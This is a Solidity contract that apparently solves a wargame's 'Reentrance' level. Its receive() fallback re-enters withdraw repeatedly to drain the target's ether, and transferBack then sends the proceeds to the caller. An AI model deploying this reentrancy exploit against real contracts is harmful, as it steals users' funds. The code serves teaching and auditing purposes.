pragma solidity ^0.6.12;

import "../levels/Reentrance.sol";

contract ReentrancyAttackFixed2 {
    Reentrance public reentrance;


    constructor(address payable reentranceAddress) public {
        reentrance = Reentrance(reentranceAddress);
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(
            address(this)
        );
        reentrance.withdraw(msg.value);
    }

    function balanceOfMe() public view returns (uint256) {
        return reentrance.balanceOf(address(this));
    }

    receive() external payable {
        uint256 myBalance = reentrance.balanceOf(address(this));
        if (myBalance > 0) {
            reentrance.withdraw(myBalance);
        }
    }

    function transferBack() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}